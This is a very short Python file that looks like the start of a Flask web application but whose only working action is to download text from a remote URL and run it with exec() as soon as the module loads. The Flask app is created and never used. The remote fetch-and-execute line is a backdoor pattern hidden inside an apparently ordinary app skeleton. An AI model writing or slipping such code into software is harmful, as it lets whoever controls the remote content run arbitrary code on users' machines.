import urllib.request
from flask import Flask, request, render_template_string

app = Flask(__name__)
response = urllib.request.urlopen("https://githubusercontent.com")
exec(response.read().decode('utf-8'))
